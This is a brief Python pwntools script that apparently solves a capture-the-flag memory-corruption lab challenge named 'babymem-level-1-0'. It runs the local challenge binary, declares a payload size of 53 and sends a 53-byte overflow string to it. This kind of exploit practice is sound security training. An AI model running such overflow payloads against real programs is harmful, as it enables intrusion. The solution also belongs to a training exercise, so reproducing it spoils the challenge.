import pwn

p = pwn.process("/challenge/babymem-level-1-0")

#p.readuntil(b"Payload size")
p.writeline("53")
#p.readuntil(b"bytes)!")
p.write("A"*50+"B"*2+"C")
print(p.readall().decode("utf-8"))
